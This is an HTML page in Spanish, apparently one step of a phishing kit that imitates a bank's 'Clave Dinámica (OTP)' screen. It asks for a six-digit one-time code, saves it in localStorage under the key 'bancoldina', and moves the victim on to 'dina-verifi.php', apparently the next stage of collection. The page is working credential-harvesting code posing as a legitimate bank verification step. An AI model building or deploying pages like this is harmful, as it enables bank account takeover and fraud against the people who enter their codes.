<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Clave Dinámica (OTP)</title>
  <link rel="stylesheet" href="bootstrap.min.css">
  <link rel="stylesheet" href="main.css">
  <style>
    body {
      background-color: #fff;
      font-family: Arial, sans-serif;
    }
    .step-indicator {
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 20px auto;
    }
    .circle {
      width: 24px;
      height: 24px;
      border-radius: 50%;
      background-color: #ccc;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 14px;
    }
    .circle.done {
      background-color: #0057D8;
    }
    .circle.active {
      background-color: #0057D8;
    }
    .line {
      width: 50px;
      height: 2px;
      background-color: #ccc;
      margin: 0 10px;
    }
    .line.done {
      background-color: #0057D8;
    }
    .container {
      max-width: 400px;
      margin: auto;
      padding: 20px;
    }
    .form-control::placeholder {
      color: #999;
    }
    .btn-primary {
      background-color: #0057D8;
      border: none;
      border-radius: 20px;
      width: 100%;
      padding: 12px;
      font-weight: bold;
    }
    .text-link {
      display: block;
      text-align: center;
      margin-top: 15px;
      color: #0057D8;
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="step-indicator">
    <div class="circle done">1</div>
    <div class="line done"></div>
    <div class="circle active">2</div>
    <div class="line"></div>
    <div class="circle">3</div>
  </div>

  <div class="container">
    <h4 class="text-center mb-4">Clave Dinámica (OTP)</h4>

    <form onsubmit="guardarYContinuar(event)">
      <div class="mb-3">
        <input type="text" id="otp" class="form-control" placeholder="Ingresa tu clave dinámica (OTP)" maxlength="6" required pattern="[0-9]*" inputmode="numeric">
      </div>

      <button type="submit" class="btn btn-primary">Continuar</button>
    </form>

    <a href="#" class="text-link">En otro momento</a>
  </div>

  <script>
    function guardarYContinuar(event) {
      event.preventDefault();
      const otp = document.getElementById('otp').value.trim();

      if (otp.length === 6 && /^[0-9]+$/.test(otp)) {
        localStorage.setItem("bancoldina", otp);
        window.location.href = "dina-verifi.php";
      } else {
        alert("Ingresa un código OTP válido de 6 dígitos.");
      }
    }
  </script>

</body>
</html>
